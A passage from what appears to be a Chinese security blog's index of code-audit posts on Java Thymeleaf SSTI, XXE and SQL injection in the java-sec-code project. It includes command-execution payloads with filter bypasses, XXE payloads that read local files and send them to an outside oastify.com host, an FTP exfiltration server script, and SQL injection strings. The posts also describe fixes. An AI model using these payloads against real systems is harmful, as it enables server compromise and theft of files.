当中找的，寻找哪个接口与 path 最符合，因为有时候接口名相同，但传参不同。\n\n\n很明显看到这里，返回的是 GET /path \n\n\n\n至此，getHandler() 的分析流程结束了，我们能够很明显的看出来它是在做 Handler Mapping 的获取与比对的操作，是为了下一步 Controller 服务的。\n\n回到 DispatcherServlet 一路往下走，到第 490 行，跟进 getHandlerAdapter() 方法看一下。\n\n\n找到目标处理器的适配器，用适配器执行目标方法。继续往下走，调用 applyPreHandle() 方法做了一个预处理。跟进 interceptor.preHandle()\n\n\n\n\n\n基本上的正常请求都是会返回 true 的，一些非常规请求很可能返回 false\n\n回到 DispatcherServlet，在它的第 504 行，进行了 handle 处理，实现执行 Controller 中 (Handler) 的方法,返回 ModelAndView 视图。跟进\n\n\n\n\n跟进至 invokeHandlerMethod()，才到了真正的业务方法。\n\n\ninvokeHandlerMethod() 方法先执行目标的 HandlerMethod，并返回一个 ModelAndView 对象。比较重要的方法在第 520 行，此处的 handlerMethod 其实是 com.drunkbaby.ssti.controller.ThymeleafController#path(String)，这一个方法，通过 this.createInvocableHandlerMethod() 方法，将其封装成 ServletInvocableHandlerMethod 类，并让其具有 invoke 执行能力。\n\n\n后续，给 invocableMethod 的各大属性赋值，在赋值完毕后 new 了一个 ModelAndViewContainer 对象，后续会将所有的值保存到这一个对象中。\n\n\n往下走，先调用 AsyncWebRequest 进行异步请求的包装，后续针对是否是异步请求，做不同的处理。继续往下走，到 553 行的地方是关键点，它调用了 ServletInvocableHandlerMethod.invokeAndHandle() 方法，调用这个方法的作用主要是获取到了 returnValueHandlers，跟进看一下。\n\n\n跟进 invokeForRequest()，先获取到参数，再调用 this.doInvoke() \n\n\n跟进 doInvoke()，会反射调用路由中类中的方法，并将参数进行传递\n\n\n此处 f8，会走到我们定义接口的方法中去。\n\n\n执行完毕后，回到 org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod，一路往下走，到第 69 行，调用了 handleReturnValue()，跟进 handler.handleReturnValue()\n\n\n上面判断如果redirect:开头，如果是的话则设置重定向的属性\n\n\n回到org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#invokeHandlerMethod\n这里调用 this.getModelAndView 获取获取 ModelAndView 对象\n\n\nView Resolver 与执行模板渲染\n目前程序已获取到了 ModelAndView，应当进行下一步的模板渲染工作了，回到 org.springframework.web.servlet.DispatcherServlet#doDispatch 方法。\n\n之前断点是下在 504 行的位置 ———— ha.handle() 处，我们继续往下走，到第 510 行，调用了 mappedHandler.applyPostHandle() 方法，mappedHandler 是一个 HandlerExecutionChain，类似于处理器的执行链。\n\n\n遍历执行拦截器postHandle，与之前获取 Handler 的流程是一致的。遍历拦截器的过程在 mvc 架构当中非常常见，比如 S2 系列的漏洞分析，也会经过拦截器的遍历。\n在遍历结束后，会走到 this.processDispatchResult() 这里，它会将 Dispatch 的结果进行加工处理，猜测这里很可能会做视图解析与渲染的工作。跟进一下\n\n\n在判断完 ModelAndView 不为空之后，调用 render() 方法，render() 方法在 Java 的模板引擎当中一般都是作为模板渲染的方法，跟进一下。\n\n\n就简单分析一下代码，前面做的是一些国际化的判断，以及赋值等，将一些属性都放到 view 这个对象当中。\n\n\n往下分析，到第 739 行，通过自己的模板引擎进行渲染，如果此处是 FreeMarker，就会去 FreeMarkerView.render()，如果是 Velocity，就会去 VelocityView.render()，我们此处是 Thymeleaf，会去到 ThymeleafView.render()，跟进。\n\n\n跟进 renderFragment() 方法。在第 101 行，判断 getTemplateName 当中是否存在 :: 这一字符，如果不存在，则不做解析处理。\n\n\n继续往下走，第 109 行，调用了 (FragmentExpression)parser.parseExpression()，对我们输入的这一串字符进行了处理。\n\n\n继续跟进 StandardExpressionPreprocessor.preprocess()\n\n\n\n先判断，input 里面是否有存在 _ 字符，如果不存在则直接返回，不做解析处理。\n\n接着，调用 PREPROCESS_EVAL_PATTERN.matcher(input);，进行正则提取，这里提取的是 _ 中间的内容。\n提取后获取到的内容是 $&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;Calc&quot;).getInputStream()).next()&#125;\n\n\n继续往下走，到了 expression.execute()，也就是命令执行的地方，语句就变成了\nnew java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"Calc\").getInputStream()).next().execute()\n\n\n\n\n至此分析过程结束。\n\nThymeleaf SSTI Bypass以下内容大多数摘自 https://www.cnpanda.net/sec/1063.html\n在正常攻击，毫无防护的时候，我们的 PoC 是这样的\n__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"touch executed\").getInputStream()).next()&#125;__::.x\n\n__$&#123;T(java.lang.Thread).sleep(10000)&#125;__::...\n\n以 __xxx__ 作为 PoC 主要部分，以 :: 结尾\n针对上文中的 SSSTI 漏洞，Thymeleaf 实际上做了修复\n\n\n传参检测与绕过先说 payload\n/path?lang=__$%7bnew%20java.util.Scanner(T%20(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x\n\n在 3.0.12 版本，Thymeleaf 在 util目录下增加了一个名为SpringStandardExpressionUtils.java的文件：\n\n\n在该文件中，就有说明：\n\n\n当调用表达式的时候，会经过该函数的判断：\n\n\n来看看该函数，可以看到其主要逻辑是首先 倒序检测是否包含 wen关键字、在(的左边的字符是否是T，如包含，那么认为找到了一个实例化对象，返回true，阻止该表达式的执行。\npublic static boolean containsSpELInstantiationOrStatic(final String expression) &#123;\n\n        final int explen = expression.length();\n        int n = explen;\n        int ni = 0; // index for computing position in the NEW_ARRAY\n        int si = -1;\n        char c;\n        while (n-- != 0) &#123;\n\n            c = expression.charAt(n);\n\n            if (ni &lt; NEW_LEN\n                    &amp;&amp; c == NEW_ARRAY[ni]\n                    &amp;&amp; (ni > 0 || ((n + 1 &lt; explen) &amp;&amp; Character.isWhitespace(expression.charAt(n + 1))))) &#123;\n                ni++;\n                if (ni == NEW_LEN &amp;&amp; (n == 0 || !Character.isJavaIdentifierPart(expression.charAt(n - 1)))) &#123;\n                    return true; // we found an object instantiation\n                &#125;\n                continue;\n            &#125;\n\n            if (ni > 0) &#123;\n                n += ni;\n                ni = 0;\n                if (si &lt; n) &#123;\n                    // This has to be restarted too\n                    si = -1;\n                &#125;\n                continue;\n            &#125;\n\n            ni = 0;\n\n            if (c == ')') &#123;\n                si = n;\n            &#125; else if (si > n &amp;&amp; c == '('\n                        &amp;&amp; ((n - 1 >= 0) &amp;&amp; (expression.charAt(n - 1) == 'T'))\n                        &amp;&amp; ((n - 1 == 0) || !Character.isJavaIdentifierPart(expression.charAt(n - 2)))) &#123;\n                return true;\n            &#125; else if (si > n &amp;&amp; !(Character.isJavaIdentifierPart(c) || c == '.')) &#123;\n                si = -1;\n            &#125;\n\n        &#125;\n        return false;\n    &#125;\n\n因此要绕过这个函数，只要满足三点：1、表达式中不能含有关键字 new2、在(的左边的字符不能是T3、不能在T和(中间添加的字符使得原表达式出现问题\n三梦师傅给出的答案是 %20(空格)，在 panda 师傅研究中发现其实还有 %0a(换行)、%09(制表符)，此外，通过 fuzzing 同样可以找到很多可以利用的字符\nurl 路径的 Thymeleaf SSTI 攻防对于 url 路径的 Thymeleaf，其实就是这一个接口\n@GetMapping(\"/doc/&#123;document&#125;\")  \npublic void getDocument(@PathVariable String document) &#123;  \n    log.info(\"Retrieving \" + document);  \n    //returns void, so view name is taken from URI  \n&#125;\n\n\n在 Thymeleaf 3.0.12 版本当中对这一漏洞也进行了修复。\n\n实际上在 3.0.12 版本，除了加了SpringStandardExpressionUtils.java，同样还增加了 SpringRequestUtils.java文件：\n\n\n\n如果视图名称包含在 URL 的路径或参数中，请避免将视图名称作为片段表达式执行\n\n意思就是如果视图的名字和 path 一致，那么就会经过 SpringRequestUtils.java 中的 checkViewNameNotInRequest 函数检测：\n\n\n可以看到，如果 requestURI 不为空，并且不包含 vn 的值，即可进入判断，从而经过 checkViewNameNotInRequest 的“良民”认证。\n首先按照上文中的 Poc：\n__$&#123;T%20(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22)&#125;__::.x/\n\n我们可以得到 vn 的值为doc/__$&#123;newjava.util.scanner(t(java.lang.runtime).getruntime().exec(&quot;calc&quot;).getinputstream()).next()&#125;__::，并且此时我们的 found 为 true，意思就是在 vn 当中存在恶意性的字符，我们的目标是让 found 为 false，以及绕过检测。\n\n\n思考一下比较流行与常规的绕过方式：大小写绕过，Unicode 绕过，URL 绕过，在尝试之后都失败了。\n那么是不是么办法了？答案是否定的（废话，三梦师傅给出了答案）\n我们先看 requestURI 是怎么来的：\n\n\n跟进 unescapeUriPath 方法，再跟进 UriEscapeUtil.unescape()\n\n\n\n\n该函数首先检测传入的字符中是否是%(ESCAPE_PREFIX)或者+，如果是，那么进行二次处理：\n\n将+转义成空格\n如果%的数量大于一，需要一次将它们全部转义\n\n处理完毕后，将处理后的字符串返还回\n如果实际不需要unescape，那么不经过处理，直接返回原始字符串对象\n最终，就得到了 requestURI，看似相当合理，既然没有特殊的地方，那么我们只需要思考，如何从正面令requestURI.contains(vn)为假，即令requestURI不等于home/__$&#123;t(java.lang.runtime).getruntime().exec(&quot;open-acalculator&quot;)&#125;__::.x即可\n这件事本质是令两个字符串不相等，并且要满足路由条件（/home/*路径下）\n那么结论就来了\nBypass 技巧 1：\n这也是三梦师傅在群里提到的\nhome;/__$&#123;t(java.lang.runtime).getruntime().exec(\"open-acalculator\")&#125;__::.x\n\n只需要在 home 的后面加上一个分号即可\n这是因为在 SpringBoot 中，SpringBoot 有一个功能叫做矩阵变量，默认是禁用状态：\n\n\n如果发现路径中存在分号，那么会调用 removeSemicolonContent() 方法来移除分号\n\n\n这样一来使得传入的字符和 vn 不相同，并且又满足路由条件！成功绕过 checkViewNameNotInRequest 的检测\nBypass 技巧 2：\n这个 Bypass 是 panda 师傅分析的时候想到的，前面也提到了，我们的实际目标就是令两个字符串不相等，并且要满足路由条件（/home/*路径下），那么：\nhome//__$&#123;t(java.lang.runtime).getRuntime().exec(&quot;open-acalculator&quot;)&#125;__::.x 和home/__$&#123;t(java.lang.runtime).getRuntime().exec(&quot;open-acalculator&quot;)&#125;__::.x 不相等，并且满足路由条件！完美！（原理不用解释了吧）\nThymeleaf SSTI 无回显问题\n这一个无回显问题其实应该算是一种攻击手法了，有点坑，这里提一嘴。\n\n对应的接口：\n@GetMapping(\"/path\")  \npublic String path(@RequestParam String lang) &#123;  \n    return \"user/\" + lang + \"/welcome\"; //template path is tainted  \n&#125;  \n  \n@GetMapping(\"/fragment\")  \npublic String fragment(@RequestParam String section) &#123;  \n    return \"welcome :: \" + section; //fragment is tainted  \n&#125;\n\n出现的场景是在片段选择器 templatename::selector 下。fragment 中 payload 前面有::,所以 payload 在 selector 位置，这里会抛异常，导致没法回显成功。而在templatename位置不会。\n只是无法回显，但依旧可以进行命令执行。\n防御措施1、配置@ResponseBody或者@RestController，经以上注解后不会进行View解析而是直接返回。2、在方法参数中加上 HttpServletResponse参数  ，此时spring会认为已经处理了response响应而不再进行视图解析。3、在返回值前面加上 “redirect:“——经RedirectView处理。\n0x05 小结挺有意思的，但是也难，仿佛看到了当时复现 log4j2 的攻防二象性。\n0x06 Refhttps://www.cnblogs.com/nice0e3/p/16212784.htmlhttps://tttang.com/archive/1412https://www.cnpanda.net/sec/1063.html\n","categories":["代码审计"],"tags":["Java","代码审计"]},{"title":"Java OWASP 中的 XXE 代码审计","url":"/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"Java XXE\n\nJava OWASP 中的 XXE 代码审计0x01 前言XML 实际上属于支持序列化与反序列化的一门语言之一，初识不懂，再识已是饱含深情。\n\n之前看的是 WebGoat，感觉那时候自己的底子太差了，看不太明白。\n\n现在回过头来看，自己会有一些比较深刻的理解吧，也尝试独立分析一个漏洞的代码审计。\n0x02 XXE 的代码审计代码审计基于这个项目：\nhttps://github.com/JoyChou93/java-sec-code\n不扯废话，直接开始\n关于审计见到的常见类&#x2F;接口关于 Java SAX 解析器简单来说，Java SAX 就是读 XML 的文件内容的，根据标签读，比较好理解。它的特点是线性方式的处理。\n关于 Java JDOM 解析器Java JDOM 解析器分析 XML 文档，可以灵活地得到一个树形结构，是轻量级的快速 API\n\n其实还有很多种解析器，它们都有各自的特点，我这里就不举例了。\n具体的可以参考此处：https://www.yiibai.com/java_xml/java_sax_parser.html\n\nXMLReader可以直接点进这个接口看一看\n\n\n这里有一长段的注释，来说明这个接口是什么用的，粗略读一下：\nXMLReader接口是一种通过回调读取XML文档的接口，其存在于公共区域中。XMLReader接口是XML解析器实现SAX2驱动程序所必需的接口，其允许应用程序设置和查询解析器中的功能和属性、注册文档处理的事件处理程序，以及开始文档解析。当XMLReader使用默认的解析方法并且未对XML进行过滤时，会出现XXE漏洞\nSAXBuilderSAXBuilder 是一个 JDOM 解析器，其能够将路径中的 XML 文件解析为 Document 对象。SAXBuilder 使用第三方 SAX 解析器来处理解析任务，并使用SAXHandler的实例侦听 SAX 事件。当SAXBuilder使用默认的解析方法并且未对XML进行过滤时，会出现 XXE 漏洞\nSAXReaderDOM4J是dom4j.org出品的一个开源XML解析包，使用起来非常简单，只要了解基本的XML-DOM模型，就能使用。DOM4J读&#x2F;写XML文档主要依赖于org.dom4j.io包，它有DOMReader和SAXReader两种方式。因为使用了同一个接口，所以这两种方式的调用方法是完全一致的。同样的，在使用默认解析方法并且未对XML进行过滤时，其也会出现XXE漏洞。\nSAXParserFactorySAXParserFactory使应用程序能够配置和获取基于SAX的解析器以解析XML文档。其受保护的构造方法，可以强制使用newInstance()。跟上面介绍的一样，在使用默认解析方法且未对XML进行过滤时，其也会出现XXE漏洞。\nDigesterDigester类用来将XML映射成Java类，以简化XML的处理。它是Apache Commons库中的一个jar包：common-digester包。一样的在默认配置下会出现XXE漏洞。其触发的XXE漏洞是没有回显的，我们一般需通过Blind XXE的方法来利用\nDocumentBuilderFactoryjavax.xml.parsers包中的DocumentBuilderFactory用于创建DOM模式的解析器对象，DocumentBuilderFactory是一个抽象工厂类，它不能直接实例化，但该类提供了一个newInstance()方法，这个方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。\n有回显的 XXE\n这一块很多文章说的一塌糊涂，有无回显都讲不明白。\n\n最开始我们看到的 XMLReader 代码，以及其他的 xxxReader 代码，都是不回显的，因为它们只是对内容进行了解析，但是并没有对内容进行读取与输出。\n\n因为 XML 也是反序列化的一种，举个简单的 🌰，我们平常的 Runtime.getRuntime.exe() 是没有回显的，如果要有回显，必须要写 byte[] code = ... 这样子，把最后的结果读取出来。\n\nDocumentBuilder XXE对应的接口代码，也仅有这一个是有回显的\n@RequestMapping(value = \"/DocumentBuilder/vuln01\", method = RequestMethod.POST)  \npublic String DocumentBuilderVuln01(HttpServletRequest request) &#123;  \n    try &#123;  \n        String body = WebUtils.getRequestBody(request);  \n logger.info(body);  \n DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();  \n DocumentBuilder db = dbf.newDocumentBuilder();  \n StringReader sr = new StringReader(body);  \n InputSource is = new InputSource(sr);  \n Document document = db.parse(is); // parse xml  \n  \n // 遍历xml节点name和value  \n StringBuilder buf = new StringBuilder();  \n NodeList rootNodeList = document.getChildNodes();  \n for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;  \n            Node rootNode = rootNodeList.item(i);  \n NodeList child = rootNode.getChildNodes();  \n for (int j = 0; j &lt; child.getLength(); j++) &#123;  \n                Node node = child.item(j);  \n buf.append(String.format(\"%s: %s\\n\", node.getNodeName(), node.getTextContent()));  \n &#125;  \n        &#125;  \n        sr.close();  \n return buf.toString();  \n &#125; catch (Exception e) &#123;  \n        logger.error(e.toString());  \n return EXCEPT;  \n &#125;  \n&#125;\n\n这里调试一下，理解一下流程，后续就不再调试了。\npayload\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?>\n&lt;!DOCTYPE Drunkbaby [\n    &lt;!ENTITY xxe SYSTEM \"file:///E:/1.txt\">\n]>\n&lt;root>&amp;xxe;&lt;/root>\n\n同时要将 Content-Type 修改为 application&#x2F;xml，不然会报错\n攻击成功的示例图，这里成功读取到了 E:/1.txt 这个文件\n\n\n这里我们还可以通过这一 payload 列出所有文件\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?>\n&lt;!DOCTYPE Drunkbaby [\n    &lt;!ENTITY xxe SYSTEM \"file:///\">\n]>\n&lt;root>&amp;xxe;&lt;/root>\n\n\n\n\n流程分析\n在对应接口处下一个断点，开始调试：\n这里先获取到 request 请求，把我们在 POST 请求中的传参保存到 body 这个字符串当中。\n\n\n下一步是 DocumnetBuilderFactory 类用 newInstance() 的方式进行实例化。本身抽象类是不可以实例化的，但是 DocumnetBuilderFactory 自己定义了一个 newInstance() 实例化的方法。\n\n\n它定义一个工厂 API，使应用程序能够获取从 XML 文档生成 DOM 对象树的解析器。\n往下，new 了一个 DocumnetBuilder 对象，这就比较像反射的概念，师傅们可以自行理解，这几步都还是比较简单的。\n\n\n这里我们得到的其实是两个抽象类的实现类\n\n\n继续往下，把我们之前 body 里面的 xml 语句读出来，进行 parse 反序列化的过程\n\n\n反序列化里面的过程就没什么好看的了，主要是将我们的 xml 参数，转换为一个 Document 对象。\n\n\n后续的过程做了遍历 xml 节点的 name 与 value\n\n\n最后我们去读取文件的结果会保存至 buf 这个变量中，如图\n\n\n无回显的 XXE很多文章讲无回显讲的很不明白，我这里总结一下。\n打无回显主要就是这种方式 ———— DNS 探测\n我们以 XMLReader XXE 为例，打个 payload\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?>\n&lt;!DOCTYPE Drunkbaby [ &lt;!ENTITY xxe SYSTEM \"http://c5i5mmjypt9i3863jvcwznj3gumka9.oastify.com\"> ]>\n\n&lt;root>&amp;xxe;&lt;/root>\n\n\n\n这就证明了存在 XXE 漏洞。要进一步利用的话，步骤在 XMLReader 里面演示一遍，后续不再赘述。\nXMLReader XXE\nXMLReader 是无回显的 XXE\n\n代码如下\n@PostMapping(\"/xmlReader/vuln\")  \npublic String xmlReaderVuln(HttpServletRequest request) &#123;  \n    try &#123;  \n        String body = WebUtils.getRequestBody(request);  \n logger.info(body);  \n XMLReader xmlReader = XMLReaderFactory.createXMLReader();  \n xmlReader.parse(new InputSource(new StringReader(body))); // parse xml  \n return \"xmlReader xxe vuln code\";  \n &#125; catch (Exception e) &#123;  \n        logger.error(e.toString());  \n return EXCEPT;  \n &#125;  \n&#125;\n\n探测一下，存在 XXE 漏洞，并且是无回显的。\n\n\n\n漏洞的进一步利用：\n\n先放一个恶意 DTD，这个一般放到 VPS 上面。\nevil.dtd\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;!ENTITY % file SYSTEM \"file:///E:/1.txt\">\n&lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://pg9ydrnt7kzybog1jz9hyjmtuk0aoz.oastify.com/?x=%file;'>\">\n%eval;\n%exfil;\n\n为啥这里要用 dns 这种攻击手段捏？因为我们正常的盲注是读不到信息的，能利用的非常非常有限，所以这里我们需要通过 dnslog 外带出数据。\n\n原理上来说是这样的：\n\n有时候如果 xxe 当中如果服务端没有正确处理好使用 try catch，那么如果抛出异常 Web 界面通常会显示这个错误，所以我们可以如此攻击。\n用 python 起一个服务器\npython3 -m http.server 9999\n\n接着发包，攻击\n\n\n这里发包肯定是没问题的，首先我们的恶意 dtd 200，被成功调用了。\n\n\n攻击是成功的，我们去到 burp 的 dnslog 界面，看到已经是成功的外带出了数据。\n\n\n这才是真正成功的攻击\n同样我们的日志里面也是有攻击痕迹的\n\n\n\n这是盲注攻击的通用手法，所以后续的攻击就挂一个 payload 和截图，师傅们可以自行复现。\n\nSAXBuilder XXE一致的 payload\n\n\nSAXReader XXE\n\nSAXParser XXE\n\nDigester XXE\n\n\n0x03 关于 Java XXE 的修复修复起来可以说是非常简单，甚至不怎么需要成本，不影响业务的。\n修复的手段主要就是一种：禁用外部实体 DTD。对于不同的解析器有不同的修复手段。\n关键语句就是这两句：\nvar xif = XMLInputFactory.newInstance();\n        // 不支持外部实体\n       // 后面两行是多加的代码 \n        xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);\n        // 不支持dtd\n        xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n\n\n感觉还是蛮简单的，就不啰嗦了。\n\n0x04 一些绕过手法与 trick编码绕过比如使用utf7\n原来\n&lt;?xml version=\"1.0\" encoding=\"utf-8\" ?>\n&lt;!DOCTYPE ANY [\n  &lt;!ENTITY f SYSTEM \"file:///etc/passwd\">\n]>\n&lt;x>&amp;f;&lt;/x>\n\n转换后\n&lt;?xml version=\"1.0\" encoding=\"utf-7\" ?>\n+ADwAIQ-DOCTYPE ANY +AFs-\n  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-\n+AF0APg-\n+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-\n\nJava XML DTD 的 trick 利用我们在 sun.net.www.protocol 包下可以看到支持的协议，有些时候需要 file 协议与 netdoc 协议一起配合使用\n&lt;!ENTITY % evil SYSTEM \"file:///\" >\n&lt;!ENTITY % print \"&lt;!ENTITY send SYSTEM 'netdoc://%evil;'>\">\n%print;\n\n\n解决文件跨行传输—— ftp&amp;jdk1.7+这里的内容是参考 Y4tacker 师傅的\n在 XXE 盲注中，我们也提到通过 http 协议访问我们的服务器会只获取被读取的文件第一行。\n参考 XXE OOB exploitation at Java 1.7+ 这篇文章，在特定情况下我们可以解决这种困境。\n在 jdk1.7 以前，可以通过http协议传输具有换行的文件的。因为java会对换行符进行URL编码然后就访问一个地址。\n但是1.7之后，就修复了这个问题，会报错。\n但是我们仍然可以用ftp服务器来接受换行文件，因为ftp没有进行类似的限制，换行之后的字符会被当做CWD命令输入。\n只要起一个恶意的FTP服务器，其他按照正常的XXE盲注打就好了。\n&lt;!ENTITY % b SYSTEM \"file:///etc/passwd\">\n&lt;!ENTITY % c \"&lt;!ENTITY &amp;#37; rrr SYSTEM 'ftp://127.0.0.1:2121/%b;'>\">\n%c;\n\npayload:\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE a [\n   &lt;!ENTITY % asd SYSTEM \"http://vps:8088/\"> \n   %asd; \n   %rrr; \n]>\n&lt;a>&lt;/a>\n\n启动ftp-server\nrequire 'socket'\n\nftp_server = TCPServer.new 2121\nhttp_server = TCPServer.new 8088\n\nlog = File.open( \"xxe-ftp.log\", \"a\")\n\npayload = '&lt;!ENTITY % b SYSTEM \"file:///tmp/1.txt\">\n           &lt;!ENTITY % c \"&lt;!ENTITY &amp;#37; rrr SYSTEM \\'ftp://127.0.0.1:2121/%b;\\'>\">\n           %c;'\n\nThread.start do\nloop do\n  Thread.start(http_server.accept) do |http_client|\n\tputs \"HTTP. New client connected\"\n\tloop &#123;\n\t\treq = http_client.gets()\n\t\tbreak if req.nil?\n\t\tif req.start_with? \"GET\"\n\t\t\thttp_client.puts(\"HTTP/1.1 200 OK\\r\\nContent-length: #&#123;payload.length&#125;\\r\\n\\r\\n#&#123;payload&#125;\")\n\t\tend\n\t\tputs req\n\t&#125;\n\tputs \"HTTP. Connection closed\"\n  end\nend\n\nend\n\nThread.start do\nloop do\n  Thread.start(ftp_server.accept) do |ftp_client|\n\tputs \"FTP. New client connected\"\n\tftp_client.puts(\"220 xxe-ftp-server\")\n\tloop &#123;\n\t\treq = ftp_client.gets()\n\t\tbreak if req.nil?\n\t\tputs \"&lt; \"+req\n\t\tlog.write \"get req: #&#123;req.inspect&#125;\\n\"\n\n\t\tif req.include? \"LIST\"\n\t\t\tftp_client.puts(\"drwxrwxrwx 1 owner group          1 Feb 21 04:37 test\")\n\t\t\tftp_client.puts(\"150 Opening BINARY mode data connection for /bin/ls\")\n\t\t\tftp_client.puts(\"226 Transfer complete.\")\n\t\telsif req.include? \"USER\"\n\t\t\tftp_client.puts(\"331 password please - version check\")\n\t\telsif req.include? \"PORT\"\n\t\t\tputs \"! PORT received\"\n\t\t\tputs \"> 200 PORT command ok\"\n\t\t\tftp_client.puts(\"200 PORT command ok\")\n\t\telse\n\t\t\tputs \"> 230 more data please!\"\n\t\t\tftp_client.puts(\"230 more data please!\")\n\t\tend\n\t&#125;\n\tputs \"FTP. Connection closed\"\n  end\nend\nend\n\nloop do\n\tsleep(10000)\nend\n\n发出的 ftp:// url 格式也可以使用 username:password 的形式。\nftp:&#x2F;&#x2F;%b:password@evil.com:8000\n\n但是显而易见这要求 %b 这个文件内容中不包含 : 不然就会，格式报错。所以还是前者比较好\n","categories":["代码审计"],"tags":["Java","代码审计"]},{"title":"Java OWASP 中的 SQL 注入代码审计","url":"/2022/09/14/Java-OWASP-%E4%B8%AD%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"Java SQL 注入\n\nJava 中的 SQL 注入代码审计代码审计基于这个项目 https://github.com/JoyChou93/java-sec-code/\n0x01 前言出于一些个人原因，决定回过头来再过一遍 Java 基础的代码审计\n也不说那么多没什么营养的话了，直接开始正文。\n0x02 由于 jdbc 拼接不当导致的 SQL 注入jdbc 存在两种方法执行 SQL 语句，分别为 PreparedStatement 和 Statement。\n普通的 Statement 的语句一般会这样写：\nString checkUserQuery = \"select userid from sql_challenge_users where userid = '\" + username_reg + \"'\";  \n\nStatement statement = connection.createStatement();  \n\nResultSet resultSet = statement.executeQuery(checkUserQuery);\n\nStatement 会直接拼接 SQL 语句，注意！，99.99999% 的 Statement 直接拼接，都会导致 SQL 注入。\n相比 Statement，还有一种执行 SQL 语句的方式是 PreparedStatement，它会对 SQL 语句进行预编译，一般长这样。\nvar statement = connection.prepareStatement(\"select password from sql_challenge_users where userid = ? and password = ?\"); \n\nstatement.setString(1, username_login);  \nstatement.setString(2, password_login);  \n\nvar resultSet = statement.executeQuery();\n\nStatement SQL 注入我们下个断点在 SQLI 这里，66 行，然后访问 /sqli/jdbc/vuln?username=123，看一下发生了什么。\n\n\n因为执行查询是我们的 SQL 语句，现在的 sql 变量的值是 ————select * from users where username = &#39;123&#39;\n攻击方式的话，用万能密码攻击即可。\n原理就不说了，太基础了，就是 SQL 语句拼接而已。\n攻击的话：payload 如下\nusername&#x3D;123&#39; or &#39;1&#39;&#x3D;&#39;1\n\nStatement SQL 注入的修复手段：预编译后面 /jdbc/sec 接口，就是修好的代码，我们不妨也打断点看看它的工作流程。\npayload 直接用 admin&#39; or &#39;1&#39;=&#39;1\n这个时候的 sql 语句始终如一都是 select * from users where username = ?；那么预编译到底是怎么实现的呢？我们的 username 是何时放进去呗查询的呢？\n不妨再深入一点跟进看一下。跟进 executeQuery()\n进来之后，第 762 行，看着像是 sql 语句的查询，跟进去 getOriginalSql() 方法看看。\n\n\n得到的结果是屁都没有，继续往下，768 行，是 executeInternal() 方法，一般 Internal 结尾的方法都是一些内部处理的方法，跟进。\n这个 executeInternal() 方法主要做了两件事：第一件事：返回查询结果，第二件事：返回查询时间。如图\n\n\n\n\n这些信息都包含在返回的 result 里面。\n所以我们能够很清楚的看到，在预编译当中，输入和 SQL 语句是完完全全分开的\n总结 JDBC 易产生漏洞点未使用占位符\nPreparedStatement 只有在使用”?”作为占位符才能预防sql注入，直接拼接仍会存在sql注入漏洞\n\n使用 in 语句删除语句中可能会存在此类语句,由于无法确定delIds含有对象个数而直接拼接sql语句，造成sql注入。\nString sql = \"delete from users where id in(\"+delIds+\"); //存在sql注入\n\n\n解决方法为遍历传入的 对象个数，使用“?”占位符。\n\n使用 like 语句\n使用like语句直接拼接会造成sql注入\n\nString sql = \"select * from users where password like '%\" + con + \"%'\"; //存在sql注入\n\n%和_\n没有手动过滤 %\n\n预编译是不能处理这个符号的， 所以需要手动过滤，否则会造成慢查询，造成 dos。\nOrder by、from 等关键字无法预编译通过上面对使用 in 关键字和 like 关键字发现，只需要对要传参的位置使用占位符进行预编译时似乎就可以完全防止 SQL 注入，然而事实并非如此，当使用 order by 语句时是无法使用预编译的，原因是 order by 子句后面需要加字段名或者字段位置，而字段名是不能带引号的，否则就会被认为是一个字符串而不是字段名，简单来说就是会报错。\n然而使用 PreapareStatement 将会强制给参数加上’，所以，在使用 order by 语句时就必须得使用拼接的 Statement，所以就会造成 SQL 注入，这里其实算是 SQL 的原生问题了；\n解决问题的话需要进行手动过滤。\nString sql = \"Select * from news where title =?\" + \"order by '\" + time + \"' asc\"\n\n0x03 Mybatis 下的 SQL 注入我们的 SQL 语句一般是写在 Mapper 里面的，正常的应该是 Controller 层调 Service 层调 pojo 层，SQL 语句是写在 Mapper 文件里面的。所以如果是从代码审计的角度来看的话，我们可以直接来看 Mapper 层的代码。\nmybatis 下的 SQL 注入mybatis 下的 SQL 注入主要是这一种情况：$&#123;Parameter&#125;\n\n$&#123;Parameter&#125;\n\n有类似的一些 CMS 0day 漏洞，比如 RuoYi &lt;&#x3D; 4.6.1 的 SQL 注入漏洞。就是这样导致的\n对应的这个项目当中，有问题的 SQL 语句如下\n//Mybatis \n@Select(\"select * from users where username = '$&#123;username&#125;'\")\nList&lt;User> findByUserNameVuln01(@Param(\"username\") String username);\n\n//Mybatis \n@GetMapping(\"/mybatis/vuln01\")\npublic List&lt;User> mybatisVuln01(@RequestParam(\"username\") String username) &#123;\n    return userMapper.findByUserNameVuln01(username);\n&#125;\n\n这里是存在漏洞的，因为 $&#123;username&#125; 的方式就是直接拼接，和之前的 jdbc 是一样的。\npayload 如下\nadmin&#39; or &#39;1&#39;&#x3D;&#39;1\n\n这里这道题目，怎么说呢；和我们平常见到的 mybatis 语句很不一样，我们平常的 SQL 语句都是写在 xxxMapper.xml 